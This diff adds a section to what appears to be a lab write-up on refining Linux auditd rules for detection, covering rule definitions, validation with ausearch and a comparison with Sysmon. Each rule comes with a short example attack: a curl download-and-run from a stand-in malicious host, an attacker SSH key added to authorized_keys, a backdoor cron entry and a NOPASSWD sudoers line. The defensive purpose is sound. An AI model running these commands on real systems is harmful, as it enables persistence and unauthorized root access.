@@ -1586,3 +1586,404 @@ The central principle is:
 
 > Telemetry should be measured by investigative usefulness, not simply by
 > event volume.
+
+---
+
+# Task 5 - auditd Rule Refinement
+
+## Goal
+
+Refine Linux audit telemetry by adding detection-focused `auditd` rules for process execution, network activity, SSH key access, cron persistence, and sudo configuration changes.
+
+The objective is to bring Linux endpoint visibility closer to the telemetry provided by Sysmon on Windows.
+
+## Script
+
+```text
+5-auditd_refine.sh
+```
+
+## Environment
+
+The task is executed on the Ubuntu Linux endpoint used as the MedDefense Linux telemetry host.
+
+Required components:
+
+```text
+auditd
+auditctl
+ausearch
+augenrules
+```
+
+The lab host runs Ubuntu 26.04. The previous `2x00` auditd hardening script was designed for Ubuntu 22.04 and correctly refused automatic remediation on the newer operating system.
+
+Therefore, the telemetry refinement rules are deployed and validated directly by this task.
+
+## Detection Rules
+
+### 1. Process Execution
+
+Audit key:
+
+```text
+process_exec
+```
+
+Rule:
+
+```text
+-a always,exit -F arch=b64 -S execve -k process_exec
+```
+
+This monitors the `execve` system call used when programs are executed.
+
+It provides Linux process execution visibility similar to Sysmon Event ID 1 on Windows.
+
+Example attacker activity:
+
+```bash
+curl http://malicious-server/payload
+chmod +x payload
+./payload
+```
+
+Process execution telemetry helps analysts identify which commands and binaries were executed on the endpoint.
+
+---
+
+### 2. Network Socket and Connection Activity
+
+Audit key:
+
+```text
+network_connect
+```
+
+Rule:
+
+```text
+-a always,exit -F arch=b64 -S socket -S connect -k network_connect
+```
+
+This monitors processes creating network sockets and initiating connections.
+
+Example attacker activity:
+
+```text
+malware
+   |
+   +-- socket()
+   |
+   +-- connect()
+   |
+   +--> Command-and-Control server
+```
+
+This telemetry can help identify unexpected outbound communication or command-and-control activity.
+
+---
+
+### 3. SSH Key Monitoring
+
+Audit key:
+
+```text
+ssh_keys
+```
+
+Required monitoring pattern:
+
+```text
+-w /home/*/.ssh/ -p rwa -k ssh_keys
+```
+
+Because auditd watch rules do not use shell wildcard expansion for paths, the implementation creates explicit rules for existing user `.ssh` directories.
+
+Example persistence technique:
+
+```bash
+echo "ssh-ed25519 AAAA..." >> ~/.ssh/authorized_keys
+```
+
+An attacker who adds their public key to `authorized_keys` may retain SSH access even after the user's password is changed.
+
+Monitoring SSH key directories therefore provides important persistence telemetry.
+
+---
+
+### 4. Cron Persistence Monitoring
+
+Audit key:
+
+```text
+cron_persist
+```
+
+Rules:
+
+```text
+-w /etc/cron.d/ -p wa -k cron_persist
+-w /var/spool/cron/ -p wa -k cron_persist
+```
+
+Cron jobs can be abused to execute malicious commands automatically.
+
+Example:
+
+```bash
+echo "* * * * * /tmp/backdoor" > /etc/cron.d/update
+```
+
+Monitoring cron directories helps detect persistence mechanisms based on scheduled execution.
+
+---
+
+### 5. sudo Configuration Monitoring
+
+Audit key:
+
+```text
+sudoers
+```
+
+Rule:
+
+```text
+-w /etc/sudoers.d/ -p wa -k sudoers
+```
+
+Changes to sudo configuration can provide persistent privilege escalation.
+
+Example:
+
+```text
+attacker ALL=(ALL) NOPASSWD:ALL
+```
+
+A malicious entry like this could allow an attacker to execute commands as root without providing a password.
+
+Monitoring `/etc/sudoers.d/` therefore provides visibility into potentially dangerous privilege changes.
+
+## Loading the Rules
+
+Persistent audit rules are stored under:
+
+```text
+/etc/audit/rules.d/
+```
+
+The updated configuration is loaded using:
+
+```bash
+sudo augenrules --load
+```
+
+Active rules can be inspected with:
+
+```bash
+sudo auditctl -l
+```
+
+## Validation
+
+The script does not assume that successfully loading a rule means that useful telemetry is being generated.
+
+Each new rule is tested with a controlled action and verified using `ausearch`.
+
+### Process Execution
+
+Trigger:
+
+```bash
+/usr/bin/id
+```
+
+Validation:
+
+```bash
+sudo ausearch -k process_exec
+```
+
+Expected result:
+
+```text
+CAPTURED
+```
+
+### Network Connection
+
+Trigger:
+
+```bash
+curl localhost
+```
+
+Validation:
+
+```bash
+sudo ausearch -k network_connect
+```
+
+Expected result:
+
+```text
+CAPTURED
+```
+
+### SSH Key Access
+
+Controlled activity is generated inside an existing `.ssh` directory.
+
+Validation:
+
+```bash
+sudo ausearch -k ssh_keys
+```
+
+Expected result:
+
+```text
+CAPTURED
+```
+
+### Cron Persistence
+
+A temporary file is created under:
+
+```text
+/etc/cron.d/
+```
+
+Validation:
+
+```bash
+sudo ausearch -k cron_persist
+```
+
+Expected result:
+
+```text
+CAPTURED
+```
+
+### sudoers Monitoring
+
+A temporary file is created under:
+
+```text
+/etc/sudoers.d/
+```
+
+Validation:
+
+```bash
+sudo ausearch -k sudoers
+```
+
+Expected result:
+
+```text
+CAPTURED
+```
+
+Controlled test artifacts are removed after validation.
+
+## Expected Result
+
+A successful validation should produce:
+
+```text
+[*] Adding detection-focused rules...
+    execve syscall tracking                   [ADDED]
+    socket/connect syscall tracking           [ADDED]
+    SSH key file monitoring                   [ADDED]
+    Cron directory monitoring                 [ADDED]
+    sudoers.d monitoring                      [ADDED]
+
+[*] Loading rules...
+    augenrules --load: OK
+
+[*] Validating new rules...
+    execve: ran /usr/bin/id                    [CAPTURED]
+    socket: curl localhost                     [CAPTURED]
+    ssh_keys: SSH key test                     [CAPTURED]
+    cron: cron persistence test                [CAPTURED]
+    sudoers: sudo configuration test           [CAPTURED]
+
+Rules added: 5 | Validation: 5/5 PASS
+```
+
+## Real-World Security Value
+
+The rules provide visibility across several important stages of an attack:
+
+```text
+Attacker executes payload
+        |
+        v
+process_exec
+        |
+        +----> opens network connection
+        |          |
+        |          v
+        |     network_connect
+        |
+        +----> installs SSH key
+        |          |
+        |          v
+        |       ssh_keys
+        |
+        +----> creates cron persistence
+        |          |
+        |          v
+        |     cron_persist
+        |
+        +----> modifies sudo configuration
+                   |
+                   v
+                sudoers
+```
+
+Together, these events allow SOC analysts to reconstruct attacker activity instead of relying only on authentication or application logs.
+
+## Windows and Linux Telemetry Comparison
+
+The project now provides complementary endpoint telemetry:
+
+| Security Activity | Windows | Linux |
+|---|---|---|
+| Process execution | Sysmon Event ID 1 | auditd `execve` |
+| Network activity | Sysmon Event ID 3 | auditd `socket/connect` |
+| Persistence | Sysmon registry/file events | cron and SSH watches |
+| Privilege changes | Windows Security logs | sudoers monitoring |
+| Investigation | Event Viewer / SIEM | `ausearch` / SIEM |
+
+## Security Engineering Lesson
+
+Installing a logging system does not guarantee detection coverage.
+
+A telemetry control should be validated using the complete cycle:
+
+```text
+Define threat
+      |
+      v
+Create telemetry rule
+      |
+      v
+Load rule
+      |
+      v
+Generate controlled activity
+      |
+      v
+Search generated telemetry
+      |
+      v
+Confirm evidence exists
+```
+
+This is the same principle used earlier with Sysmon: **deployment does not equal coverage**.
+
+The purpose of telemetry engineering is not simply to collect logs, but to ensure that the logs contain enough evidence for analysts to understand what an attacker actually did.
